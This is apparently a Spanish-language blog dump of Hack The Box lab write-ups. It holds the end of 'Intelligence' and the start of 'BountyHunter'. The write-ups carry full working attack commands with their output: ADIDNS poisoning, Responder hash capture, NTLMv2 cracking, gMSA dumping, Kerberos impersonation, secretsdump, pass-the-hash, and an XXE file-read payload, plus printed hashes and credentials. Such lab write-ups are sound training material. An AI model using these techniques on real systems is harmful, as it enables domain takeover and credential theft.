user.txt 075fbb0ca2160f9734fe17358c73b628 π ~/htb/intelligence ❯ Ted - User En el recurso IT encontramos un script de powershell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/intelligence ❯ smbclient \\\\\\\\intelligence.htb\\\\IT -U Tiffany.Molina # NewIntelligenceCorpUser9876 Enter WORKGROUP\\Tiffany.Molina\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Apr 18 20:50:55 2021 .. D 0 Sun Apr 18 20:50:55 2021 downdetector.ps1 A 1046 Sun Apr 18 20:50:55 2021 3770367 blocks of size 4096. 1460874 blocks available smb: \\\u0026gt; get downdetector.ps1 getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/intelligence ❯ Segun su contenido se ejecuta cada 5 minutos, realiza una busqueda de objetos con el nombre que contenga web* dentro del AD es decir una URL que luego utiliza para realizar una solicitud, y, que segun la Documentacion utiliza las credenciales del usuario que realiza esta solicitud, para finalmente verificar el estado, si es una respuesta no igual a 200 envia un Correo electronico utilizando el cmdlet Send-MailMessage al usuario Ted indicando que la URL (u objeto) está caido.\nAl filtrar los objetos web* esta realizando una busqueda de registros de dominios, además esta haciendo uso del modulo ActiveDirectory.\n1 2 3 4 5 6 7 8 9 10 # Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem \u0026#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\u0026#34; | Where-Object Name -like \u0026#34;web*\u0026#34;) { try { $request = Invoke-WebRequest -Uri \u0026#34;http://$($record.Name)\u0026#34; -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -To \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -Subject \u0026#34;Host: $($record.Name) is down\u0026#34; } } catch {} } La informacion del script nos llevo a ADIDNS Poisoning, \u0026ldquo;Relaying\u0026rdquo; Kerberos y Delegate Your Way.\nIn order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services (AD-DS) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS (ADIDNS).\nDNS Record Se menciona en ADIDNS poisoning que los usuarios \u0026ldquo;regulares\u0026rdquo; pueden crear objetos.\nSince ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.\nDNSTool Basado en eso utilizamos dnstool del toolkit de krbrelayx, esto con el objetivo de agregar un registro DNS. Iniciamos creando un entorno virtual con virtualenv.\n1 2 virtualenv krbrelayx source krbrelayx/bin/activate Realizamos un query a un \u0026ldquo;subdominio\u0026rdquo; que conocemos, el cual nos devolvio que existe y la direccion IP del registro.\n1 2 3 4 5 6 7 8 9 10 11 12 13 (krbrelayx) π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence\\\\Tiffany.Molina -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; --record \u0026#39;dc.intelligence.htb\u0026#39; --action query 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found record dc DC=dc,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb [+] Record entry: - Type: 28 (Unsupported) (Serial: 74) DC=dc,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb [+] Record entry: - Type: 1 (A) (Serial: 74) - Address: 10.10.10.248 (krbrelayx) π krbrelayx master ✗ ❯ Como sabemos existe un script que realiza una solicitud hacia direcciones que contengan web*, agregamos un registro con esta palabra.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 (krbrelayx) π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence\\\\Tiffany.Molina -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; --record \u0026#39;webx.intelligence.htb\u0026#39; --action add --data 10.10.14.24 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [+] LDAP operation completed successfully (krbrelayx) π krbrelayx master ✗ ❯ python3 dnstool.py -u intelligence\\\\Tiffany.Molina -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; --record \u0026#39;webx.intelligence.htb\u0026#39; --action query 10.10.10.248 [-] Connecting to host... [-] Binding to host [+] Bind OK [+] Found record webx DC=webx,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb [+] Record entry: - Type: 1 (A) (Serial: 75) - Address: 10.10.14.24 Confirmamos con dig que dicha direccion fue registrada a nuestra direccion IP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 (krbrelayx) π krbrelayx master ✗ ❯ dig webx.intelligence.htb @10.10.10.248 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.15-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; webx.intelligence.htb @10.10.10.248 ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 29036 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;webx.intelligence.htb. IN A ;; ANSWER SECTION: webx.intelligence.htb. 180 IN A 10.10.14.24 ;; Query time: 76 msec ;; SERVER: 10.10.10.248#53(10.10.10.248) ;; WHEN: Sun Jul 11 02:47:20 EDT 2021 ;; MSG SIZE rcvd: 66 (krbrelayx) π krbrelayx master ✗ ❯ Escuchamos con netcat el puerto 80 y obtuvimos una solicitud por parte de la maquina.\n1 2 3 4 5 6 7 (ldapdomaindump) π ldapdomaindump master ✗ ❯ sudo nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.24] from intelligence.htb [10.10.10.248] 61096 GET / HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852 Host: webx Connection: Keep-Alive Responder Con ello confirmamos que realiza la solicitud a cada 5 minutos, utilizamos responder donde obtuvimos el hash de Ted.Graves, ya que el script utiliza las credenciales del usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.24] Challenge set [random] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;] [+] Current Session Variables: Responder Machine Name [WIN-B3PL3QLKQOU] Responder Domain Name [YFNL.LOCAL] Responder DCE-RPC Port [48424] [+] Listening for events... [HTTP] Sending NTLM authentication request to 10.10.10.248 [HTTP] GET request from: 10.10.10.248 URL: / [HTTP] Host : webx [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 John - Crack The Hash Crackeamos la contraseña de Ted utilizando John con el wordlist rockyou.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/intelligence ❯ cat hash_ted.txt Ted.Graves::intelligence:aae02c86a392025c:BDB7208972780C8A4CC1E9ABFEB732F7:0101000000000000701069866076D701DE61F30888CEE4A40000000002000800590046004E004C0001001E00570049004E002D004200330050004C00330051004C004B0051004F00550004001400590046004E004C002E004C004F00430041004C0003003400570049004E002D004200330050004C00330051004C004B0051004F0055002E00590046004E004C002E004C004F00430041004C0005001400590046004E004C002E004C004F00430041004C00080030003000000000000000000000000020000024C537F3A4AFF46737ABD3E6A78F3F281EDA563CF71819110E512CE0047058B90A001000000000000000000000000000000000000900340048005400540050002F0077006500620078002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 π ~/htb/intelligence ❯ john hash_ted.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Mr.Teddy (Ted.Graves) 1g 0:00:00:06 DONE (2021-07-11 03:11) 0.1582g/s 1711Kp/s 1711Kc/s 1711KC/s Mrz.deltasigma..Morgant1 Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed π ~/htb/intelligence ❯ Con crackmapexec confirmamos que las credenciales nos dan acceso por smb y ldap, aunque solamente con permisos de Lectura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/intelligence ❯ crackmapexec ldap intelligence.htb -u Ted.Graves -p Mr.Teddy LDAP 10.10.10.248 389 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) LDAP 10.10.10.248 389 DC [+] intelligence.htb\\Ted.Graves:Mr.Teddy π ~/htb/intelligence ❯ crackmapexec smb intelligence.htb -u Ted.Graves -p Mr.Teddy --shares SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Ted.Graves:Mr.Teddy SMB 10.10.10.248 445 DC [+] Enumerated shares SMB 10.10.10.248 445 DC Share Permissions Remark SMB 10.10.10.248 445 DC ----- ----------- ------ SMB 10.10.10.248 445 DC ADMIN$ Remote Admin SMB 10.10.10.248 445 DC C$ Default share SMB 10.10.10.248 445 DC IPC$ READ Remote IPC SMB 10.10.10.248 445 DC IT READ SMB 10.10.10.248 445 DC NETLOGON READ Logon server share SMB 10.10.10.248 445 DC SYSVOL READ Logon server share SMB 10.10.10.248 445 DC Users READ π ~/htb/intelligence ❯ Privesc Bloodhound Bloodhound.py nos permitió recolectar informacion, importamos la informacion obtenida, con ello encontramos que el grupo IT Support al cual Ted.Graves pertenece, puede recuperar contraseñas de cuentas en este caso svc_int$, y este ultimo tiene atributos Constrained Delegation sobre el Domain Controler lo que permite autenticarse como cualquier usuario.\ngMSADumper La informacion presentada en Bloodhound muestra la herramienta GMSAPasswordReader.exe pero es necesario una shell por lo que utilizamos gMSADumper para obtener el hash del usuario svc_int$.\n1 2 3 4 5 6 (gMSADumper) π gMSADumper main ✗ ❯ ./gMSADumper.py -u Ted.Graves -p Mr.Teddy --ldapserver 10.10.10.248 -d intelligence.htb Users or groups who can read password for svc_int$: \u0026gt; DC$ \u0026gt; itsupport svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 (gMSADumper) π gMSADumper main ✗ ❯ GetST Utilizamos getST para obtener un ticket para suplantar un usuario, en este caso Administrator, aunque nos mostró un error.\n1 2 3 4 5 6 π ~/htb/intelligence ❯ impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int$ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) π ~/htb/intelligence ❯ Resolvimos este error sincronizando la hora con la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/intelligence ❯ sudo ntpdate 10.10.10.248 \u0026amp;\u0026amp; impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 intelligence.htb/svc_int 11 Jul 14:05:05 ntpdate[235302]: step time server 10.10.10.248 offset +1.266772 sec Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache π ~/htb/intelligence ❯ ls -lah Administrator.ccache -rw-r--r-- 1 kali kali 1.6K Jul 11 14:05 Administrator.ccache π ~/htb/intelligence ❯ SecretsDump Luego obtuvimos el hash del usuario Administrator utilizando secretsdump.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/intelligence ❯ export KRB5CCNAME=Administrator.ccache π ~/htb/intelligence ❯ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user Administrator Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6 Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0 Administrator:des-cbc-md5:2362bc3191f23732 [*] Cleaning up... π ~/htb/intelligence ❯ Shell Finalmente obtuvimos acceso por WinRM haciendo Pass-the-Hash para obtener nuestra flag root.txt y user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 π ~/htb/intelligence ❯ evil-winrm -i 10.10.10.248 -u Administrator -H 9075113fe16cf74f7c0f9b27e882dad3 Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami intelligence\\administrator *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ../Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/10/2021 11:15 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt 8ff6dc01a05ae1bb4f5f36cce5290167 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cd ../../Tiffany.Moline/Desktop *Evil-WinRM* PS C:\\Users\\Tiffany.Molina\\Desktop\u0026gt; dir Directory: C:\\Users\\Tiffany.Molina\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 7/10/2021 11:15 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\Tiffany.Molina\\Desktop\u0026gt; type user.txt 075fbb0ca2160f9734fe17358c73b628 *Evil-WinRM* PS C:\\Users\\Tiffany.Molina\\Desktop\u0026gt; ","description":"En Intelligence realizamos una enumeracion de usuarios en los metadatos de PDFs para luego realizar 'Password Spraying' lo que nos dio acceso a un primer usuario. Encontramos un script en un recurso de samba lo que nos permitió obtener el hash de un segundo usuario tras ejecutar Responder y krbrelayx. Bloodhound nos mostró que uno de los usuarios tiene la caracteristica de leer constraseñas de cuentas gMSA, este ultimo tambien tiene caracteristicas 'Delegation' sobre el DC, con esta informacion obtuvimos acceso como administrador con gMSADumper y impacket.","id":42,"section":"posts","tags":["dnsscan","exiftool","password-spraying","smb","crackmapexec","adidns","krbrelayx","responder","bloodhound","gmsadumper","impacket"],"title":"Hack The Box - Intelligence","uri":"https://sckull.github.io/posts/intelligence/"},{"content":"\rEn BountyHunter explotamos una vulnerabilidad XXE la cual permitio obtener credenciales para acceder a la maquina. Obtuvimos acceso root mediante el analisis y explotacion de un script en Python especificamente de la funcion eval().\nNombre BountyHunter OS Linux Puntos 20 Dificultad Facil IP 10.10.11.100 Maker ejedev\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5, 4.4, 4.8, 5.2, 5.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[4, 3, 3, 7, 7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80, 5000), https (443), smb (139, 445), mysql (3306), winrm (5985).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.91 scan initiated Sat Jul 24 18:18:08 2021 as: nmap -Pn -sV -sC -p22,80 -oN scans 10.10.11.100 Nmap scan report for 10.10.11.100 (10.10.11.100) Host is up (0.20s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Bounty Hunters Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 24 18:18:21 2021 -- 1 IP address (1 host up) scanned in 12.80 seconds Web Site Encontramos una pagina estatica donde se muestran distintas direcciones, aunque no muestra informacion relevante.\nDevelopment - User La direccion del Portal nos muestra una nueva direccion donde se muestra un nuevo formulario.\n1 2 3 4 5 6 7 π ~/htb/bountyhunter ❯ curl -s http://10.10.11.100/portal.php \u0026lt;html\u0026gt; \u0026lt;center\u0026gt; Portal under development. Go \u0026lt;a href=\u0026#34;log_submit.php\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt; to test the bounty tracker. \u0026lt;/center\u0026gt; \u0026lt;/html\u0026gt; π ~/htb/bountyhunter ❯ Al llenar el formulario se muestra el contenido enviado en la pagina.\nCapturamos el trafico con Burpsuite y vemos que se envia los datos codificados en base64.\nXXE Vemos que el contenido es una estructura en XML.\n1 2 3 4 5 6 7 8 9 π ~/htb/bountyhunter ❯ echo PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU+CgkJPGN3ZT5jd2U8L2N3ZT4KCQk8Y3Zzcz5jdnNzPC9jdnNzPgoJCTxyZXdhcmQ+cmV3YXJkPC9yZXdhcmQ+CgkJPC9idWdyZXBvcnQ+ | base64 -d \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;title\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;cwe\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;cvss\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;reward\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt; π ~/htb/bountyhunter ❯ Tomamos en cuenta que la pagina esta escrita en PHP (segun su extension), modificamos un payload para leer el contenido de la pagina actual.\n1 2 3 4 5 6 7 8 echo -n \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;bugreport\u0026gt; \u0026lt;title\u0026gt;a\u0026lt;/title\u0026gt; \u0026lt;cwe\u0026gt;\u0026amp;xxe; sckull\u0026lt;/cwe\u0026gt; \u0026lt;cvss\u0026gt;b\u0026lt;/cvss\u0026gt; \u0026lt;reward\u0026gt;c\u0026lt;/reward\u0026gt; \u0026lt;/bugreport\u0026gt;\u0026#39; | base64 | tr -d \u0026#39;\\n\u0026#39; \u0026amp;\u0026amp; echo \u0026#34;\u0026#34; Codificamos en base64 y utilizando CyberChef codificamos en url nuestro payload.\nTras enviar la solicitud logramos obtener el codigo fuente, realizamos lo mismo con direcciones que ya conociamos pero no obtuvimos nada interesante, solo un nombre de usuario: development.\nphp\rphp\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //tracker_diRbPr00f314.php \u0026lt;?php if(isset($_POST[\u0026#39;data\u0026#39;])) { $xml = base64_decode($_POST[\u0026#39;data\u0026#39;]); libxml_disable_entity_loader(false); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); $bugreport = simplexml_import_dom($dom); } ?\u0026gt; If DB were ready, would have added: \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Title:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;title; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;CWE:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;cwe; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Score:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;cvss; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Reward:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;reward; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //../log_submit.php \u0026lt;?php if(isset($_POST[\u0026#39;data\u0026#39;])) { $xml = base64_decode($_POST[\u0026#39;data\u0026#39;]); libxml_disable_entity_loader(false); $dom = new DOMDocument(); $dom-\u0026gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); $bugreport = simplexml_import_dom($dom); } ?\u0026gt; If DB were ready, would have added: \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Title:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;title; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;CWE:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;cwe; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Score:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;cvss; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;Reward:\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;\u0026lt;?php echo $bugreport-\u0026gt;reward; ?\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin Directory Brute Forcing Con Feroxbuster enumeramos direcciones y directorios donde encontramos el archivo db.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/bountyhunter ❯ feroxbuster -u http://10.10.11.100/ -w $MD -x php,html,txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.100/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html, txt] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 388l 1470w 0c http://10.10.11.100/index.php 301 9l 28w 316c http://10.10.11.100/resources 301 9l 28w 313c http://10.10.11.100/assets 200 5l 15w 125c http://10.10.11.100/portal.php 301 9l 28w 310c http://10.10.11.100/css 200 0l 0w 0c http://10.10.11.100/db.php 301 9l 28w 309c http://10.10.11.100/js 403 9l 28w 277c http://10.10.11.100/server-status [####################] - 35m 2646540/2646540 0s found:8 errors:10 [####################] - 35m 882180/882180 410/s http://10.10.11.100/ Obtuvimos el codigo fuente de este archivo y encontramos credenciales para una base de datos. nmap no mostró ningun puerto relacionado a una base de datos.\n1 2 3 4 5 6 7 8 9 // db.php \u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; $testuser = \u0026#34;test\u0026#34;; ?\u0026gt; 